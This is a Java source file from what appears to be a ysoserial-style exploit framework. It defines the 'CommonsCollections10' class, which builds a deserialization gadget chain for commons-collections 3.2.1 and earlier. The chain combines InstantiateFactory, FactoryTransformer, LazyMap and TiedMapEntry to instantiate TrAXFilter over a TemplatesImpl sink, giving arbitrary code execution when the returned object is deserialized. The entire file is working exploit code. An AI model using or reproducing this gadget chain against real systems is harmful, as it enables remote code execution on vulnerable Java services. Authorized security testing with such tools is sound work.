package com.ppp.chain.commonscollections3;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;
import com.ppp.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.util.HashMap;

/**
 * @author Whoopsunix
 */
@Dependencies({"commons-collections:commons-collections:<=3.2.1"})
@Sink({Sink.TemplatesImpl})
public class CommonsCollections10 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections10.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        String s = RanDomUtils.generateRandomString(1);

        InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});
        FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);
        ConstantTransformer constantTransformer = new ConstantTransformer(1);

        HashMap innerMap = new HashMap();
        LazyMap outerMap = (LazyMap) LazyMap.decorate(innerMap, constantTransformer);
        TiedMapEntry entry = new TiedMapEntry(outerMap, s);

        HashMap hashMap = new HashMap();
        hashMap.put(entry, s);
        Reflections.setFieldValue(outerMap, "factory", factoryTransformer);
        outerMap.clear();

        return hashMap;
    }
}
